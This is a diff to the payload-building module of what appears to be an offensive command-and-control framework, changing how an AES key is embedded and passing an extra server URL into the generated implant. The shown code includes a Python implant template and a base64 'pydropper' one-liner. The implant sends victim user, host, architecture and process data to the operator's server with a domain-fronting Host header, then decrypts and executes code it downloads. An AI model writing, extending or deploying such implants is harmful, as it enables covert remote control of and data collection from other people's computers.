@@ -3,7 +3,7 @@
 from Core import *
 from Config import *
 from Colours import *
-import StringIO, gzip, io, base64, subprocess, os, hashlib
+import StringIO, gzip, io, base64, subprocess, os, hashlib, re
 
 class Payloads(object):
 
@@ -26,16 +26,33 @@ class Payloads(object):
     self.Referer = Referer
     self.ConnectURL = ConnectURL
     self.BaseDirectory = BaseDirectory
-    self.PythonKey = gen_key()
-    with open("%saes.py" % FilesDirectory, 'rb') as f:
-      content = f.read()
-      content = content.replace("#REPLACEKEY#","#%s" % self.PythonKey)
-      self.PythonHash = hashlib.sha512(content).hexdigest()
+    if os.path.exists("%saes.py" % PayloadsDirectory):
+      print "FOUND AES"
+      with open("%saes.py" % PayloadsDirectory, 'rb') as f:
+        content = f.read()
+        import re
+        m = re.search('#KEY(.+?)#KEY', content);
+        if m: keyfound = m.group(1)
+        print keyfound
+        self.PythonHash = hashlib.sha512(content).hexdigest()
+        self.PythonKey = keyfound
+    else: 
+      self.PythonKey = gen_key()
+      randomkey = self.PythonKey
+      with open("%saes.py" % FilesDirectory, 'rb') as f:
+        content = f.read()
+      aespy = content.replace("#REPLACEKEY#","#KEY%s#KEY" % randomkey)
+      filename = "%saes.py" % (self.BaseDirectory)
+      output_file = open(filename, 'w')
+      output_file.write(aespy)
+      output_file.close()
+      self.PythonHash = hashlib.sha512(aespy).hexdigest()       
     self.Python = """import urllib2,os,sys,base64,ssl,socket,pwd,hashlib,time
 kd=time.strptime("%s","%%d/%%m/%%Y")
 pyhash="%s"
 pykey="%s"
 key="%s"
+serverclean="%s"
 url="%s"
 url2="%s"
 hh="%s"
@@ -55,7 +72,7 @@ encsid=encrypt(key, '%%s;%%s;%%s;%%s;%%s;' %% (un,hn,hn,arch,pid))
 if hh:r=urllib2.Request(url2,headers={'Host':hh,'User-agent':ua,'Cookie':'SessionID=%%s' %% encsid})
 else:r=urllib2.Request(url2,headers={'User-agent':ua,'Cookie':'SessionID=%%s' %% encsid})
 res=urllib2.urlopen(r);html=res.read();x=decrypt(key, html).rstrip('\\0');exec(x)
-    """ % (self.KillDate,self.PythonHash,self.PythonKey,self.Key,(self.HostnameIP+":"+self.Serverport+"/"+QuickCommand+"_py"),(self.HostnameIP+":"+self.Serverport+self.ConnectURL+"?m"),self.DomainFrontHeader,self.UserAgent)
+    """ % (self.KillDate,self.PythonHash,self.PythonKey,self.Key,(self.HostnameIP+":"+self.Serverport+"/"),(self.HostnameIP+":"+self.Serverport+"/"+QuickCommand+"_py"),(self.HostnameIP+":"+self.Serverport+self.ConnectURL+"?m"),self.DomainFrontHeader,self.UserAgent)
     self.C2Core = """%s
 $sc="%s"
 $s="%s"
@@ -325,23 +342,13 @@ ao.run('%s', 0);window.close();
     output_file.write(cs)
     output_file.close()
 
-  def CreatePythonAES(self):
-    randomkey = self.PythonKey
-    with open("%saes.py" % FilesDirectory, 'rb') as f:
-      content = f.read()
-    aespy = content.replace("#REPLACEKEY#","#%s" % randomkey)
-    filename = "%saes.py" % (self.BaseDirectory)
-    output_file = open(filename, 'w')
-    output_file.write(aespy)
-    output_file.close()
-
   def CreatePython(self, name=""):
     self.QuickstartLog( ""+Colours.END )
     self.QuickstartLog( "OSX Python Payload:"+Colours.GREEN )
     py = base64.b64encode(self.Python)
     #print self.Python
     pydropper = "echo \"import sys,base64;exec(base64.b64decode('%s'));\" | python &" % py
-    filename = "%spy_dropper.py" % (self.BaseDirectory)
+    filename = "%s%spy_dropper.py" % (self.BaseDirectory,name)
     output_file = open(filename, 'w')
     output_file.write(pydropper)
     output_file.close()
